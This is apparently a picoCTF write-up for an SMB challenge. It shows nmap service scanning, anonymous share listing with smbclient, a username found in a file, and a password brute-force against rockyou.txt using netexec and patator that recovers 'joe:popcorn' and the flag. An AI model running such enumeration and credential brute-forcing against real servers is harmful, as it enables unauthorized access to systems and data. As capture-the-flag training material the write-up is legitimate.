# URL
https://learn.cylabacademy.org/library/734
# Concept
* SMB enumeration
* SMB password brute-forcing
# Method of solve
There's another printer on a specific port
```
nmap -vv -sV -p51333 green-hill.picoctf.net
```
It's Samba, like the previous challenge
```
smbclient -L //green-hill.picoctf.net -N -p 51333
```
There are two shares, a `/shares` share and a `/secure-shares` share

In the `/shares` share there is a `notification.txt` file that has a username: `joe`
```
smbclient //green-hill.picoctf.net/shares -N -p 51333
```
We can brute-force the password in a few different ways. This one is for `netexec`
```
nxc smb green-hill.picoctf.net -u 'joe' -p /usr/share/wordlists/rockyou.txt --port 51333 --ignore-pw-decoding
```
But `patator` is much faster than NXC for SMB brute force
```
patator smb_login host=green-hill.picoctf.net user=joe password=FILE0 0=/usr/share/wordlists/rockyou.txt port=58827 -x ignore:fgrep='FAILURE'
```
We find these credentials: `joe:popcorn`
```
smbclient //green-hill.picoctf.net/secure-shares -U joe -p 55702
```
The flag is in there
